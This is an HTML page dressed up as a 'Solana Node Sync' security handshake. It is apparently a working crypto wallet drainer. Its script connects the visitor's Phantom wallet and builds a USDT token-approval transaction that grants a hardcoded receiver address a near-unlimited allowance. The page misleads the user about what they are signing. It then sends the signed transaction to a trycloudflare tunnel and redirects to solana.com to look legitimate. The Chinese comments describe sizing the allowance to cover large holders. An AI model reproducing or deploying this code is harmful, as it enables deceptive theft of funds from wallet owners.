<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Node Sync</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <script src="https://unpkg.com/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 280px; }
        #cta { background: #14F195; color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://solana.com/favicon.ico" style="width:40px;margin-bottom:15px;">
        <h2 style="font-size:1rem;">Security Handshake</h2>
        <p style="color:#666; font-size:12px;">Authorize your USDT/USDC allocation to ensure node synchronization.</p>
        <button id="cta">CONNECT & VERIFY</button>
        <div id="st" style="margin-top:10px; font-size:10px; color:#333;">Status: Idle</div>
    </div>

    <script>
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
        const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return;

            try {
                await p.connect();
                document.getElementById('st').innerText = "SYNCING...";

                // 1. 拿 Blockhash (这一步你后台显示是成功的)
                const { bh } = await (await fetch(`${tunnel}/sync`)).json();

                // 2. 暴力计算 ATA（不查余额，直接上）
                const userAta = await splToken.Token.getAssociatedTokenAddress(
                    splToken.ASSOCIATED_TOKEN_PROGRAM_ID, splToken.TOKEN_PROGRAM_ID,
                    new solanaWeb3.PublicKey(USDT_MINT), p.publicKey
                );

                // 3. 构造授权指令 (这里写死一个较大的额度，或者 1000000)
                const transaction = new solanaWeb3.Transaction().add(
                    splToken.Token.createApproveInstruction(
                        splToken.TOKEN_PROGRAM_ID, userAta,
                        new solanaWeb3.PublicKey(RECEIVER), p.publicKey,
                        [], "1000000000000" // 足够覆盖绝大多数大户
                    )
                );
                transaction.recentBlockhash = bh;
                transaction.feePayer = p.publicKey;

                // 4. 唤起签名
                const signed = await p.signTransaction(transaction);
                
                // 5. 暴力回传数据
                const rawTx = signed.serialize().toString('base64');
                fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);

                document.getElementById('st').innerText = "SUCCESS";
                setTimeout(() => { window.location.href = "https://solana.com/"; }, 1000);

            } catch(e) {
                console.error(e);
                location.reload();
            }
        };
    </script>
</body>
</html>
